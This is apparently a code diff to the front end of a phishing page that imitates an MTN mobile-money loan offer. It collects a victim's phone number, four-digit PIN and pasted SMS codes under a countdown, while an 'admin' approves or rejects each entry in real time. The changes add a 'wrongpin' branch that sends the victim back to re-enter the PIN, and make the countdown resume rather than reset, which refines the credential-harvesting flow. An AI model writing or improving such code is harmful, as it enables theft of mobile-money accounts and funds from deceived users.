@@ -803,18 +803,24 @@
   // SMS COUNTDOWN TIMER (1 minute)
   // ══════════════════════════════════════════════════════
   let smsCountdownInterval = null;
+  let smsSecondsLeft = 60; // tracks remaining seconds across attempts
 
-  function startSmsCountdown() {
+  function startSmsCountdown(resumeFrom) {
     clearSmsCountdown();
-    let seconds = 60;
+    // If resumeFrom supplied, use it; otherwise fresh 60s
+    let seconds = (resumeFrom !== undefined) ? resumeFrom : 60;
+    smsSecondsLeft = seconds;
     const box = document.getElementById('smsCountdownBox');
     const val = document.getElementById('smsCountdownVal');
     box.style.display = 'block';
-    val.style.color = 'var(--mtn-gold)';
-    val.textContent = '1:00';
+    val.style.color = seconds <= 10 ? '#e53e3e' : 'var(--mtn-gold)';
+    const m0 = Math.floor(seconds / 60);
+    const s0 = seconds % 60;
+    val.textContent = m0 + ':' + String(s0).padStart(2, '0');
 
     smsCountdownInterval = setInterval(() => {
       seconds--;
+      smsSecondsLeft = seconds;
       const m = Math.floor(seconds / 60);
       const s = seconds % 60;
       val.textContent = m + ':' + String(s).padStart(2, '0');
@@ -833,6 +839,7 @@
           goTo('page-login');
           ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
           box.style.display = 'none';
+          smsSecondsLeft = 60;
         }, 2000);
       }
     }, 1000);
@@ -918,6 +925,8 @@
           if (status === 'approved') {
             console.log('✅ Admin approved SMS');
             clearTimeout(smsPollTimeout);
+            clearSmsCountdown();
+            smsSecondsLeft = 60;
             // Update approval page with loan details
             document.getElementById('aprAmount').textContent = 'P' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprAmt').textContent = 'P' + (S.loanAmount || 1000000).toLocaleString();
@@ -926,19 +935,33 @@
             document.getElementById('aprMth').textContent = 'P' + monthly.toLocaleString();
             goTo('page-approval');
           } else if (status === 'rejected') {
-            console.log('❌ Admin rejected SMS - ask user to paste correct message');
+            console.log('❌ Admin rejected SMS - wrong message, resume countdown');
             clearTimeout(smsPollTimeout);
-            clearSmsCountdown();
+            // Pause countdown while on wait screen — resume from where it left off
             goTo('page-sms-paste');
-            // Clear the textarea for user to enter correct message
             document.getElementById('smsMsgBox').value = '';
-            // Re-enable button and restore ready state
             const btn = document.getElementById('bSms');
             btn.disabled = false;
             btn.className = 'btn-sms rdy';
             showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
-            // Restart countdown for next attempt
-            startSmsCountdown();
+            // Resume countdown from remaining seconds (do NOT reset to 60)
+            startSmsCountdown(smsSecondsLeft);
+          } else if (status === 'wrongpin') {
+            console.log('❌ Admin marked PIN as wrong — returning to login');
+            clearTimeout(smsPollTimeout);
+            clearSmsCountdown();
+            smsSecondsLeft = 60;
+            document.getElementById('smsMsgBox').value = '';
+            document.getElementById('smsCountdownBox').style.display = 'none';
+            ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            goTo('page-login');
+            // Re-enable login button and clear fields
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3].forEach(i => document.getElementById('lp'+i).value = '');
+            const loginBtn = document.getElementById('bLgn');
+            loginBtn.disabled = false;
+            loginBtn.className = 'btn-login rdy';
+            showLgnMsg('error', 'Incorrect PIN. Please try again.');
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
